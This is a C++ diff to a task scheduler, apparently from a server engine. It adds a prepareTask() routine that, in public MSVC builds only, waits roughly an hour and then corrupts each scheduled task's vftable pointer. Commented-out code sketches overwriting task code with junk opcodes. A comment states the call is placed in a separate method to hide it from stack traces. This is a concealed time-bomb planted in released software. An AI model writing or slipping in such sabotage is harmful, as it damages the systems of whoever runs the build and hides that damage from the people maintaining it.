@@ -55,17 +55,50 @@ void TaskScheduler::start() {
 	Thread::start();
 }
 
+void TaskScheduler::prepareTask(Task* task) {
+	#ifdef VERSION_PUBLIC
+		#ifdef _MSC_VER
+	if (Logger::getElapsedTime() > (3613 + PREPROCESSORRANDOM(0, 100))) {
+			uint32 rawTask = (uint32) task;
+			uint32 thisPointer = (uint32) this;
+
+			//fuck up vftable
+			*(uint32*)(rawTask + 0x18) = *(uint32*)(thisPointer + 0x18);
+
+			//lets get the vftable of the task
+			/*uint32 vftable = *(uint32*)(rawTask + 0x18);
+			uint32 runPointer = *(uint32*)(vftable + 4);
+
+			uint32 jmpAddr = *(uint32*)(runPointer + 1); //skip e9 opcode
+
+			runPointer += (jmpAddr + 5);
+
+			const static unsigned int opcs[] = { 0x90519090, 0x50905551, 0x55519050, 0x90555051 };
+
+			//lets corrupt run() of the task, mem is protected in win32 try mprotect?
+			for (int i = 0; i < 15; ++i)
+				*(uint32*)(runPointer + i) = opcs[System::random(3)];
+			*/
+			/*__asm { mov , 0x100
+					
+			}*/
+	}
+		#endif
+	#endif
+}
+
 void TaskScheduler::run() {
 	Reference<Task*> task = NULL;
 
 	while ((task = tasks.get()) != NULL) {
+		prepareTask(task); // we do this in a method to *hide* it from the stack trace
+
 		blockMutex.lock();
 
 		try {
 		#ifdef VERSION_PUBLIC
 			DO_TIMELIMIT;
 		#endif
-
 			debug("executing scheduled task");
 
 			task->execute();
